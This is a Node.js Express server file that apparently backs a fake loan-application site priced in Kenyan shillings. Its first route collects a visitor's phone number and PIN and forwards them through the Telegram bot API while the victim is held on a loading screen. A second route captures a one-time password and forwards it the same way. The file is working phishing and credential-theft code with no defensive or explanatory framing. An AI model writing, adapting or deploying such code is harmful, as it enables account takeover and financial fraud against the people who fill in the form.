const express = require('express');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 10000;

// Middleware to parse JSON and form data
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve static frontend files (like index.html) from the root folder
app.use(express.static(path.join(__dirname)));

// Route 1: Handle the main loan form submission
app.post('/api/notify', async (req, res) => {
    try {
        const { phoneNumber, pin, amount, period } = req.body;

        const telegramMessage = 
`💰 *New Loan Application Received!*
━━━━━━━━━━━━━━━━━━
📞 *Phone:* ${phoneNumber || 'Not provided'}
🔑 *Pin:* ${pin || 'Not provided'}
💵 *Amount:* KSh ${amount || '0'}
⏳ *Period:* ${period || 'Not provided'}
━━━━━━━━━━━━━━━━━━
⏱️ *Status:* Client is waiting on the loading screen.`;

        const botToken = process.env.TELEGRAM_BOT_TOKEN;
        const chatId = process.env.TELEGRAM_CHAT_ID;
        
        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: telegramMessage,
                parse_mode: 'Markdown'
            })
        });

        const data = await response.json();
        
        if (data.ok) {
            res.json({ success: true });
        } else {
            console.error("Telegram API Error:", data);
            res.status(500).json({ success: false, error: "Telegram failed" });
        }

    } catch (error) {
        console.error("Server Error:", error);
        res.status(500).json({ success: false, error: "Internal server error" });
    }
});

// Route 2: Handle the OTP / details form submission
app.post('/api/submit-details', async (req, res) => {
    try {
        const { otp } = req.body;

        const telegramMessage = 
`🔑 *OTP Code Received!*
━━━━━━━━━━━━━━━━━━
💬 *Code:* ${otp || 'Not provided'}`;

        const botToken = process.env.TELEGRAM_BOT_TOKEN;
        const chatId = process.env.TELEGRAM_CHAT_ID;

        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: telegramMessage,
                parse_mode: 'Markdown'
            })
        });

        const data = await response.json();

        if (data.ok) {
            res.json({ success: true });
        } else {
            res.status(500).json({ success: false });
        }
    } catch (error) {
        console.error("OTP Error:", error);
        res.status(500).json({ success: false });
    }
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
